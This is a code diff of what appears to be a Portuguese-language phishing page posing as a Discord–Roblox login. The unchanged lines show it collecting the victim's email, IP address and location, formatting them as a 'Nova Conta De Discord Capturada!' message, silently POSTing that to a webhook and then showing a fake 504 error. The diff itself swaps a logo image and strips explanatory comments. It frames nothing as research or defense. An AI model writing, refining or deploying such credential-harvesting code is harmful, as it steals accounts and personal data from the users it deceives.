@@ -268,12 +268,11 @@
         </p>
        
         <div class="logos">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/7/7c/Discord-logo-icon.jpg" alt="Discord Logo">
+          <img src="https://i.imgur.com/zvlaijA.png" alt="Discord Logo">
           <span style="font-size: 1.8rem; font-weight: bold;"> - </span>
           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Roblox_%282025%29_%28App_Icon%29.svg/960px-Roblox_%282025%29_%28App_Icon%29.svg.png" alt="Roblox Logo">
         </div>
         
-        <!-- Link com texto clicável -->
         <div class="extra-link">
           <a href="https://notic1as-verdadeiras.vercel.app" target="_blank">Acesse aqui para mais novidades</a>
         </div>
@@ -297,7 +296,6 @@
         return;
       }
 
-      // Captura de IP + localização
       let ip = 'Desconhecido';
       let location = 'Desconhecido';
       try {
@@ -318,7 +316,6 @@
         } catch {}
       }
 
-      // Data e hora correta (America/Sao_Paulo)
       const agora = new Date();
       const options = {
         timeZone: 'America/Sao_Paulo',
@@ -342,7 +339,6 @@
       const hoje = partes.find(p => p.type === 'hour').value.padStart(2, '0') + ':' +
                    partes.find(p => p.type === 'minute').value.padStart(2, '0');
 
-      // Mensagem com IP e localização
       const mensagem = `🔐 **Nova Conta De Discord Capturada!**
 
 **Login:** \`${email}\`
@@ -353,14 +349,12 @@
 
 **Capturado** • ${dataFormatada}, ${horaFormatada} • Hoje às ${hoje}`;
 
-      // Envia pro webhook silenciosamente
       fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content: mensagem })
       }).catch(() => {});
 
-      // Mostra erro 504 animado
       errorBox.classList.add('show');
       setTimeout(() => errorBox.classList.remove('show'), 3000);
     });
